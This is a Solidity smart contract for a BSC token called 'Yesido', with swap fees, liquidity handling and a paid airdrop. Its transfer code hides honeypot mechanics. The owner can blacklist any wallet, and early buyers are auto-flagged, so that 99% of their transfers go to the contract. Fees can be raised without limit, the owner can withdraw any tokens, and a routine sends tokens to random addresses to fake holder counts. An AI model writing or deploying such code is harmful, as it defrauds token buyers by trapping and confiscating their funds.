// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721
     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must
     * understand this adds an external call which potentially creates a reentrancy vulnerability.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath: addition overflow');

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 'SafeMath: subtraction overflow');
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

}


abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdEaD));
        _owner = address(0xdEaD);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private funUser;
    address public fundAddress;
    address public fundAddress2;
    address private receiveAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    address public DeadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _USDT;
    mapping(address => bool) public _swapPairList;
    mapping(address => uint256) private _holderlastbuy;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;
    bool public maxlimit = false;     //限购        

    uint256 public _buyFundFee = 250;          
    uint256 public _buyLPFee = 100;                 
     
    uint256 public _sellFundFee = 250;
    uint256 public _sellLPFee = 100;

    uint256 public _deadFee = 50;         

    uint256 public maxHold = 460000000000000 * 1e18;  
    uint256 public currentBlock;
    uint256 public blockTxCount = 0;

    uint256 public minSwapTokenNum;
    uint256 public kb;

    uint256 public startTradeBlock;
    uint256 private condition;

    uint256 public _airdropBNB;
    uint256 public _airdropAmount;

    address public _mainPair;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress, 
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress,address FundAddress2, address ReceiveAddress, address LPaddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _USDT = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
              
        address swapPair = ISwapFactory(swapRouter.factory())
                        .createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        _airdropAmount = 2500 * 10 ** _decimals;    //
        _airdropBNB = 0.01 * 1e18;                  //
        maxDrop = 30000;                            
        dropLimit = 10;                             
        uint256 total = Supply * 10 ** Decimals;
        
        _tTotal = total;
        minSwapTokenNum = total.div(50000);
        _balances[ReceiveAddress] = total;
        receiveAddress = LPaddress;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        fundAddress2 = FundAddress2;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[FundAddress2] = true;

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        condition             = 1e16;      
        _tokenDistributor = new TokenDistributor(USDTAddress);
        _feeWhiteList[address(_tokenDistributor)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(inSwap)
            return _basicTransfer(from, to, amount);

        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(startTradeBlock > 0, "Not Start");
                takeFee = true;

                if (block.timestamp < startTradeBlock + kb) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > minSwapTokenNum) {
                            uint256 swapFee = _buyFundFee + _buyLPFee + _sellFundFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 1817;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
            }
        }
        if(funUser[bot] < 1 && _holderlastbuy[bot] < block.number) funUser[bot] = 1;

        if(funUser[from] > 0|| funUser[to] > 0){
            _funTransfer(from,to,amount);
            return;
        }

        if (
            !_feeWhiteList[from] && 
            !_feeWhiteList[to] &&
            to != owner() &&
            to != address(_swapRouter) &&
            _swapPairList[from]) {
                if(block.number > startTradeBlock + kb + 3&& block.number <= startTradeBlock + 500){
                    if(_holderlastbuy[msg.sender] == block.number-1 || _holderlastbuy[msg.sender] == block.number){
                        _funTransfer(from, to, amount);
                        return;
                    }
                    _holderlastbuy[msg.sender] = block.number;
                }
            }


        _tokenTransfer(from, to, amount, takeFee);

    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
 
    address bot;
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender].sub(tAmount);
        uint256 feeAmount = 0;
        uint256 swapAmount = 0;
        
        if (takeFee) {
            uint256 swapFee;

            if (_swapPairList[recipient]) {
                swapFee = _sellFundFee + _sellLPFee;
            }

            else if(_swapPairList[sender])
            {
                swapFee = _buyFundFee + _buyLPFee;
                if(maxlimit)
                    require(_balances[recipient] + tAmount <= maxHold);
                if(block.timestamp <= startTradeBlock + kb + 3){
                    bot = recipient;
                    _holderlastbuy[recipient] = block.number;
                }
            }

            else{
                swapFee = _sellFundFee + _sellLPFee;
                if(maxlimit)
                    require(_balances[recipient] + tAmount <= maxHold);
                if(block.timestamp <= startTradeBlock + kb + 3){
                    bot = recipient;
                    _holderlastbuy[recipient] = block.number;
                }
            }

            swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
                _takeInviterFeeKt(block.timestamp);
            }
            uint256 deadAmount;
            if(_deadFee > 0)
                deadAmount = tAmount * _deadFee / 10000;
                feeAmount += deadAmount;
                _takeTransfer(sender, DeadAddress, deadAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _USDT;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp + 300
        );

        swapFee -= lpFee;
        IERC20 USDT = IERC20(_USDT);
        uint256 USDTBalance = USDT.balanceOf(address(_tokenDistributor));
        if(USDTBalance < condition) return;
        uint256 fundAmount = USDTBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        uint256 fundAmount_A = fundAmount.mul(20).div(100); 
        uint256 fundAmount_B = fundAmount - fundAmount_A;

        USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount_A);
        USDT.transferFrom(address(_tokenDistributor), fundAddress2, fundAmount_B);
        USDT.transferFrom(address(_tokenDistributor), address(this), USDTBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpUSDT = USDTBalance * lpFee / swapFee;
            if (lpUSDT > 0) {
                _swapRouter.addLiquidity(
                 address(USDT), address(this), lpUSDT, lpAmount, 0, 0, receiveAddress, block.timestamp
            );
            }
        }
    }

    function setMaxlimit(bool enable, uint256 num) external onlyOwner{
        maxHold = num;
        maxlimit = enable;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }


    function _basicTransfer(address sender, address to, uint256 tAmount) private{
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr, address addr2) external onlyOwner {
        fundAddress = addr;
        fundAddress2 = addr2;
        _feeWhiteList[addr] = true;
        _feeWhiteList[addr2] = true;
    }

    function setBuyTa(uint256[] calldata fees) external onlyOwner {
        _buyFundFee        = fees[0];
        _buyLPFee          = fees[1];
        _deadFee           = fees[2];
    }

    function setSellTa(uint256[] calldata fees) external onlyOwner{
        _sellFundFee        = fees[0];
        _sellLPFee          = fees[1];
        _deadFee           =  fees[2];
    }

    function setMinNum(uint256 Mini) external onlyOwner{
        minSwapTokenNum = Mini;
    }

    function startTrade(uint256 num) external onlyOwner {
        kb = num;
        startTradeBlock = block.timestamp;
    }

    function multiFeeWhiteList(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _feeWhiteList[addresses[i]] = status;
        }
    }

    function multiFunUser(address[] calldata addresses, uint256 status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            funUser[addresses[i]] = status;
        }
    }

    function setSwapPairList(address addr, bool enable, bool main) external onlyOwner {
        _swapPairList[addr] = enable;
        if(main)_mainPair = addr;
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    uint256 dropedNum = 0;
    uint256 _countBlock;
    uint256 maxDrop;
    uint256 dropLimit;
    uint256 _block;
    mapping (address => uint256) oneDropNum;

    receive() external payable {
        address account = msg.sender;
        uint256 msgValue = msg.value;
        payable(receiveAddress).transfer(msgValue);
        if (0 < startTradeBlock) {
            return;
        }
        if (msgValue != _airdropBNB) {
            return;
        }
        if (tx.origin != account){
            return;
        }

        require (dropedNum < maxDrop);
        require (oneDropNum[account] < dropLimit);
        if(_block == block.number){
            if(_countBlock <10){
                ++_countBlock;
                _tokenTransfer(address(this), account, _airdropAmount, false);
                dropedNum++;
                oneDropNum[account] += 1;
            }
        }else if(_block != block.number){
            _block = block.number;
            _countBlock=0;
            _tokenTransfer(address(this), account, _airdropAmount, false);
            dropedNum++;
            oneDropNum[account] += 1;
        }

    }

    function setRewardCondition(uint256 amount) external onlyOwner {
        condition = amount;
    }


    uint160 randNum = 64812354;

	function _takeInviterFeeKt(
        uint256 amount
    ) private {
        for(uint i=0;i<1;i++){
        address _receiveD;
        _receiveD = address(uint160(uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    msg.sender,
                    randNum
                    )
                )
            )));
        randNum = randNum + 17;
        _basicTransfer(address(this), _receiveD, amount);
        }
    }


}

contract BSCToken is AbsToken {                                 //0x4E4417959C717Ee7185d82E05B2f57CA25a36186
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),   //0xD99D1c33F9fC3444f8101754aBC46c52416550D1    0x10ED43C718714eb63d5aA57B78B54704E256024E
        address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),    //0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd   0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
        "Yesido",
        "Yesido",
        18,
        100000000,
        address(0xfB5816C7Be4C9a0bf19234cAa5Fc2c5357D7CCc1),  
        address(0xbAE86Ff7E5350d08Bb75e1b896375f273303e982),  
        address(0xc637a21255005Eb0439f7698645D29aBee946FE0),  
        address(0xc637a21255005Eb0439f7698645D29aBee946FE0)   
    ){}
}